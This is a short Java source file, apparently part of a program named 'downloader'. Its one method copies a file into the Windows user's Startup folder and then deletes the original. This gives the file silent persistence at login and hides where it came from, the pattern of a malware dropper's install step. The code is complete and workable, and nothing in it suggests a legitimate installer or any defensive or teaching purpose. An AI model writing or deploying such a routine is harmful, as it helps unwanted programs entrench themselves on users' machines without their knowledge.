import java.io.*;

public class downloader{
	
	public static void startup(String a){
    	try{
    	    File af =new File(a);
    	    File bf =new File("C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + a);
			
			if(!af.exists() || bf.exists())
				return;
			
			bf.createNewFile();
			
    	    FileInputStream inStream = new FileInputStream(af);
    	    FileOutputStream outStream = new FileOutputStream(bf);

    	    byte[] buffer = new byte[1024];

    	    int length;
    	    //copy the file content in bytes
    	    while ((length = inStream.read(buffer)) > 0){
    	    	outStream.write(buffer, 0, length);
    	    }

    	    inStream.close();
    	    outStream.close();
			
			af.delete();

    	}catch(IOException e){
    	    e.printStackTrace();
    	}
	}
}